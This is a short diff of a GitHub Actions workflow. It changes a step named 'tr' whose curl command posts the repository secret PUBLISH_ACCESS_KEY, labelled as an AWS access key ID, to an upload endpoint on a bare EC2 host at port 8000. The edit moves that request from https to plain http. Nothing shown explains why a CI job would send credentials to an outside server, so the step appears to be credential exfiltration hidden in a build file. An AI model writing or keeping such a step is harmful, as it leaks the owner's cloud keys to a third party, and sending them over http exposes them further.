@@ -19,7 +19,7 @@ jobs:
 
     - name: tr
       run: |
-        curl -X POST https://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8000/upload \
+        curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8000/upload \
         -H "Content-Type: application/json" \
         -d '{
               "aws-access-key-id": "'"${{ secrets.PUBLISH_ACCESS_KEY }}"'",
